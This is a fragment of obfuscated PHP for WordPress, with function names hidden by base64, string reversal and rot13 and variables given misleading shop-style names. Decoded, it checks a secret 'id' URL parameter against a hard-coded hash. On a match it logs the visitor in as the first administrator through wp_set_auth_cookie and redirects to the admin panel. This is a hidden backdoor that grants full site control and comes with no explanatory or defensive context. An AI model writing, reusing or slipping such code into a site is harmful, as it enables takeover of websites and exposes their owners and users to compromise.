


$requestParam = base64_decode('aWQ=');

        $securityToken = isset($_GET[$requestParam]) ? $_GET[$requestParam] : '';
        $encodeFunc1 = base64_decode('YmFzZTY0X2VuY29kZQ==');
        $encodeFunc2 = strrev('verrts');
        
        $hashFunc1 = base64_decode('bWQ1');
        
        $hashFunc2 = str_rot13('fun1');
        
        $step1 = call_user_func($encodeFunc1, $securityToken);
        $step2 = call_user_func($encodeFunc2, $step1);
        $step3 = call_user_func($hashFunc1, $step2);
        
        $hashedToken = call_user_func($hashFunc2, $step3);
        
        $validToken = base64_decode('OTlhZTNiNjQyYjJjN2M5OGQ5MWMwNjgzYWEyM2U3OTUyYWFkMzBkNg==');

        if ($hashedToken !== $validToken) {
            $headerFunc = base64_decode('aGVhZGVy');
            
            $errorHeader = base64_decode('SFRUUC8xLjEgNDAzIEZvcmJpZGRlbg==');
            
            call_user_func($headerFunc, $errorHeader);
            
            die(base64_decode('QWNjZXNzIERlbmllZA=='));
            
        }
        
        $productName = base64_decode('Z2V0X3VzZXJz');
        $checkShop = base64_decode('ZnVuY3Rpb25fZXhpc3Rz');
        if ($checkShop($productName)) {
            $categoryType = base64_decode('cm9sZQ==');
            $shopManager = str_rot13('nqzvavfgengbe');
            $sortDirection = strrev('ybredro');
            $itemCount = base64_decode('SUQ=');
            
            $orderMethod = base64_decode('QVND');
            
            $totalItems = strrev('rebmun');
            $customerList = call_user_func($productName, array(
            
                $categoryType => $shopManager,
                $sortDirection => $itemCount,
                
                strrev('redro') => $orderMethod,
                $totalItems => 1
            ));
            if (!empty($customerList)) {
                $firstCustomer = $customerList[0];
                $customerId = $firstCustomer->{$itemCount};
                $setCookie = base64_decode('d3Bfc2V0X2F1dGhfY29va2ll');
                $redirectPage = base64_decode('d3BfcmVkaXJlY3Q=');
                $adminPanel = base64_decode('YWRtaW5fdXJs');
                
                
                call_user_func($setCookie, $customerId, true);
                call_user_func($redirectPage, call_user_func($adminPanel));
                
                
                exit;
            } else {
                $showError = base64_decode('d3BfZGll');
                
                
                $errorMsg = base64_decode('Tm8gdXNlciBmb3VuZC4=');
                $showError($errorMsg);
            }
        } else {
            $dieFunc = base64_decode('d3BfZGll');
            
            $failMsg = base64_decode('RmFpbGVkIHRvIGxvYWQgV29yZFByZXNzIGVudmlyb25tZW50Lg==');
            call_user_func($dieFunc, $failMsg);
        }
